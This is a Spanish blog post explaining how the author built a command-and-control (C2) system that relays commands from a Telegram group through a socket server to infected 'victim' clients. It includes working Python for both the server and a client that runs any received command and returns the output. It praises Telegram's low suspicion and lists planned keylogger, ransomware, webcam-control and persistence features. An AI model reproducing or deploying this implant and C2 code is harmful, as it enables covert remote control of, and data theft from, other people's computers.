---
title: "Controlando bots con Telegram: así hice mi propio C2"
date: 2025-03-25
tags: ["command-and-control", "ciberseguridad", "post", "python"]
categories: ["Python Ofensivo"]
draft: false
cover:
  image: "/images/C2_Over_Tg/esquema_c2.png"
  alt: "Imagen del post"
  relative: false

---

# Introdución

En este post voy a explicar como desarrollé un sistema de **Command and Control (C2)** utilizando **Telegram** como canal de comunicaciones. La idea era tener algo desplegable desde cualquier dispositivo, que fuera discreto y que no dependiera de servidores caros o infraestructuras complejas, Entonces valoré dos opciones o **Discord** o **Telegram**, ya que la implementación de sus **APIs** es fácil de usar, al final me quedé con Telegram.

## ¿Por qué Telegram?

-  Es gratuito

-  Tiene API pública

-  No levanta sospechas (todo el mundo lo usa).

-  Puedes usar tanto bots, grupos o canales para interactuar

Basicamente al usarlo como canal de **C2** me evito tener que montar servidores web o gestionar dominios ya que me aprovecho de su infraestructura para enviar y recibir mensajes entre clientes

---

## Set-Up 

Antes de entrar en el desarrollo y la parte tecnica voy a explicar como crear **tu propio bot**, **ver su token**, **crear el grupo** y conseguir el **chat ID** para que asi puedas seguir el desarrollo conmigo

### Crear el bot

Crear el bot es muy fácil solo tendremos que ir a telegram y buscar el usuario **@BotFather**, una vez estemos en el chat con él solo tendremos que escribir **/newbot**, nos pedira dos nombres, el primero sera el de usuario normal y el segundo sera el @ que tiene que acabar en bot, una vez le digamos los nombres nos dara el token del bot

![bot-father](/images/C2_Over_Tg/chat_bot_father.png)

Despues de esto tendremos de cambiar un ajuste del bot, le escribiremos **/mybots** seleccionaremos el que acabmos de crear, después **Bot settings**, luego **Group Privacy** y le tendremos que dar a **turn off** 

Ahora ya tendriamos el BOT creado

### Crear Grupo

Crear el grupo es aun mas fácil, le daremos a New Group en el menu principal, le pondremos un nombre, el que sea y añadiremos a nuestro bot, una vez creado si miramos los miembros y en nuestro bot nos pone **Has access to the messages** esta todo bien configurado

Solo nos faltara conseguir el chat **ID**, hay dos maneras

- Añadir un bot ya hecho que al ponerlo en el grupo te da la **ID**

- Hacer que tu bot te mande el chat **ID**

La **primera opción** es la más fácil y el bot que yo uso para ver las **IDs** es **@getidsbot**, lo añades y te da el chat ID

![idsbot](/images/C2_Over_Tg/getidsbot.png)

La **segunda opción** es sencilla también este sería el codigo que tendriamos que ejecutar para que nuestro bot nos de la iD

Este sería un **codigo en python** para hacer eso

````python
import telebot

TOKEN = "El token del bot"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(func=lambda message: True)
def get_chat_id(message):
    chat_id = message.chat.id
    bot.reply_to(message, f"🆔 Este es el chat ID: `{chat_id}`", parse_mode="Markdown")

bot.polling()
````

Ejecutamos el script y escribimos **cualquier cosa** en el grupo que queramos la **ID**

![damelaid](/images/C2_Over_Tg/damelaidperro.png)

**Ahora ya podemos pasar a la parte tecnica**

---

## Arquitectura general

El **C2** tiene dos componentes principales

- **Cliente (víctima):** se conecta al servidor, espera ordenes, las ejecuta y devuelve los resultados

- **Servidor (C2):** esta conectado a un grupo de Telegram, recibe comandos desde ahi y los distribuye a los agentes

---

## Desarrollo

Aqui voy a relatar mas o menos como lo fui desarrollando poco a poco

### Primeros pasos

Empecé definiendo la estructura básica del proyecto: era un **cliente** que se conecta a un **servidor mediante sockets**. El servidor a la vez esta conectado a un **grupo de telegram mediante un bot** que escucha comandos enviados en el grupo y los dirije a los clientes

**Esquema de la estructura:**
![Esquma de C2](/images/C2_Over_Tg/esquema_c2.png)

**Esta sería un poco la estructura mas básica del servidor:**

#### Servidor:
```python
import socket
import threading
import telebot

# Configuración del bot de Telegram y del servidor C2
TOKEN = "TOKEN_DEL_BOT_DE_TELEGRAM"
C2_CHANNEL_ID = "ID_DEL_GRUPO_O_CANAL"
C2_SERVER_IP = "0.0.0.0"
C2_SERVER_PORT = 9090

# Inicializamos el bot y la lista de clientes conectados
bot = telebot.TeleBot(TOKEN)
clients = []

# Función que controlara cada cliente en un hilo aparte
def handle_client(client_socket):
    while True:
        try:
            pass  # De momento no hace nada aquí, todo se controla desde Telegram
        except:
            # Si hay algun error, eliminamos al cliente y cerramos su socket
            clients.remove(client_socket)
            client_socket.close()
            break

# Esto enciende el servidor TCP que esta en espera conexiones de clientes
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((C2_SERVER_IP, C2_SERVER_PORT))
    server.listen(5)
    print(f"[+] Esperando conexiones en {C2_SERVER_IP}:{C2_SERVER_PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"[+] Nuevo cliente conectado: {addr}")
        clients.append(client_socket)
        # Cada cliente es un hilo aparte por si llegan varios a la vez
        threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start()

# Cada vez que alguien escribe en el grupo esta función se ejecuta y procesa el mensaje
@bot.message_handler(func=lambda m: True)
def handle_telegram_command(message):
    command = message.text  # Obtenemos el texto del mensaje como comando

    if not clients:
        bot.send_message(C2_CHANNEL_ID, "[!] No hay clientes conectados.")
        return

    for client in clients:
        try:
            client.send(command.encode())       # Enviamos el comando al cliente
            response = client.recv(4096).decode()  # Esperamos su respuesta
            bot.send_message(C2_CHANNEL_ID, f"[+] Respuesta del cliente:\n{response}")
        except Exception as e:
            bot.send_message(C2_CHANNEL_ID, f"[!] Error con cliente: {e}")

# Lanzamos el servidor en segundo plano y arrancamos el bot
threading.Thread(target=start_server, daemon=True).start()
bot.polling()
```

#### Cliente:

```python
import socket
import subprocess

# Configuración del servidor al que se conectará el cliente
SERVER_IP = "IP_DEL_SERVER"
SERVER_PORT = 9090

def connect_to_server():
    # Creamos el socket y nos conectamos al servidor C2
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, SERVER_PORT))

    while True:
        try:
            # Esperamos un comando del servidor
            command = client.recv(4096).decode()
            if not command:
                break  # Si no hay comando, se rompe el bucle

            # Ejecutamos el comando recibido en el sistema
            result = subprocess.getoutput(command)

            # Enviamos el resultado de vuelta al servidor
            client.send(result.encode())

        except:
            break  # Si hay cualquier error, salimos del bucle

    client.close()  # Cerramos el socket si se sale del bucle

# Llamamos a la función para iniciar la conexión
connect_to_server()
```

#### Ejemplo de chat con este código:

![chat_inicial](/images/C2_Over_Tg/chat_telegram_inicial.png)

Esta estructura es muy básica y ya me empecé a dar cuenta de muchas cosas que se tenian que mejorar como por ejemplo:

- **Creacion de diferentes canales por cliente** para asi poder tener multiples a la vez y poder tener un canal de comunicaciones privado con cada uno de ellos

- Que no fueran comandos directos sino que hubieran ya multiples **funcionalidades definidas** como **(/screenshot /download...)** 

- **Cifrado fuerte de las comunicaciones** para mayor seguridad y privacidad

- **Comandos globales a multiples clientes** para poder lanzar quiza ataques distribuidos 

- Tambien queria pasar toda la estructura del servidor a **POO** con **clases** para hacer mas bonito y eficiente el codigo


## Mejoras

Bascicamente lo primero que hice fue pasar todo a POO creando dos clases principales en el servidor

```python
class ClientSession:

    def __init__(self, socket, address):
        self.socket = socket
        self.address = address
        self.ip = address[0]
        self.username = None
        self.os_version = None
        self.topic_id = None

    def send_command(self, command):
        try:
            self.socket.send(command.encode("utf-8"))
            response = self.socket.recv(4096).decode("utf-8").strip()
            return response if response else "[Sin respuesta]"
        except Exception as e:
            return f"[!] Error executing the command: {e}"

    def close(self):
        try:
            self.socket.close()
        except Exception as e:
            print(f"[!] Error closing the connection with {self.ip}: {e}")

class C2Server:

    def __init__(self):
        self.clients = {}
        self.active_shell_sessions = {}
        self.server = None

        signal.signal(signal.SIGINT, self.shutdown)
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect("c2.db")
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS clients (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            telegram_id TEXT,
                            ip TEXT,
                            username TEXT,
                            topic_id INTEGER)''')
        conn.commit()
        conn.close()
```

-  La primera clase se encarga gestionar y almacenar los datos de lo que sería en si la sessión de cada cliente 

-  La segunda clase sería donde primero inicializariamos la base de datos y luego definiriamos toda la logica y funciones de el servidor

---

 Despues fui desarrollando lo que sería una base mas solida y ordenada de el sistema

```python
if __name__ == "__main__":
    try:
        c2 = C2Server()
        bot.message_handler(func=lambda message: True)(c2.handle_command)
        threading.Thread(target=c2.start_server, daemon=True).start()
        bot.polling()
    except Exception as e:
        print(colored(f"[!] Error: {e}", 'red'))
```

Esto es lo que controla el *flujo del servidor* y como veis primero instancia la clase del servidor,luego al message_handler del bot le assigna la función *handle_command* para que cuando reciba un mensaje lo pueda processar y analizar

---

```python
    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((C2_SERVER_IP, C2_SERVER_PORT))
        self.server.listen(5)
        print(f"[C2] Servidor esperando conexiones en {C2_SERVER_IP}:{C2_SERVER_PORT}...")
        bot.send_message(C2_CHANNEL_ID, f"🚀 C2 Server Started at {C2_SERVER_IP}:{C2_SERVER_PORT} 🚀\n", parse_mode="Markdown")

        while True:
            try:
                client_socket, client_address = self.server.accept()
                print(f"[+] New connection {client_address}")
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket, client_address), daemon=True)
                client_thread.start()
            except Exception as e:
                print(f"[C2] Error with the connection: {e}")
```

Esta sería la función que se encarga de iniciar el servidor y de ponerse en espera de conexiones, a parte envia un mensaje al canal general del grupo para informar de que se ha iniciado

---

```python
    def handle_command(self, message):

        if message.message_thread_id is None:
            self.handle_global_command(message)
            return

        conn = sqlite3.connect("agents.db")
        cursor = conn.cursor()
        cursor.execute("SELECT ip FROM clients WHERE topic_id = ?", (message.message_thread_id,))
        client = cursor.fetchone()
        conn.close()
        
        if not client:
            return
        
        client_ip = client[0]
        text = message.text.lower()

        if text == "/status":
            self.check_bot_status(client_ip, message.message_thread_id)
            return

        elif text.startswith("/shell"):
            command = text.replace("/shell ", "")
            self.send_command_to_client(self.clients[client_ip], command, message.message_thread_id)

        elif text == "/delete":
            bot.delete_forum_topic(C2_CHANNEL_ID, message.message_thread_id)
```

Esta función es la encargada de *analizar el mensaje* que se ha enviado por el grupo y si es algun comando ejecuta la debida función

---

```python
    def send_command_to_client(self, client_socket, command, topic_id):
        try:
            client_socket.socket.send(command)
            
            response = self.recv_all(client_socket.socket).strip()

        except Exception as e:
            bot.send_message(C2_CHANNEL_ID, f"❌ Error executing the command: {e}", message_thread_id=topic_id)
```

Esta función se encarga de enviar el comando a el agente y esperar una respuesta

Aquí ya se podría a empezar a aplicar condicionales para tratar diferente las respuestas en base si son un archivo o una imagen

---

```python
def recv_all(self, sock):
    try:
        total_size = int(sock.recv(10).decode().strip())
        data = b""
        while len(data) < total_size:
            data += sock.recv(min(4096, total_size - len(data)))
        return data
    except:
        return b""
```

Esta ultima función es la que se encarga de recivir los datos de la respuesta del agente

### Esta sería la base inicial de el C2 

---

## Próximos pasos

A partir de esta base fui mejorando el proyecto paso a paso: reestructurando el código, añadiendo nuevas funciones y centrándome sobre todo en hacerlo más estructurado y escalable. Lo que has visto aquí es solo el inicio, una especie de **mínimo viable** funcional.

En el [repositorio de GitHub](https://github.com/17tayyy/TgRAT) he dejado un **roadmap** con todas las mejoras que tengo previstas. Algunas de las más interesantes son:

- Sistema de autenticación para agentes (con clave precompartida o firmas).
- Persistencia del agente en el sistema (registro, tareas programadas…).
- Registro completo de los comandos ejecutados.
- Agrupación de bots por etiquetas (OS, localización, etc).
- Agente multiplataforma (Windows, Linux, MacOS).
- Funciones ofensivas avanzadas como **keylogger**, **ransomware** y **control de webcam**.
- Soporte para canales alternativos de C2 (Discord, API directa de Telegram...).
- Dashboard web opcional para gestionar bots y comandos en tiempo real.

Y no, no es un proyecto que vaya a quedar tirado. Lo voy actualizando constantemente y me sirve tanto para aprender como para experimentar con ideas nuevas.  
Esto es solo la primera entrega.

Nos vemos en la siguiente 😈

> 📬 ¿Tienes dudas, sugerencias o ideas para mejorar esto?
> Puedes abrir una issue o dejar un comentario en el repo. Me mola ver cómo otros lo enfocan.

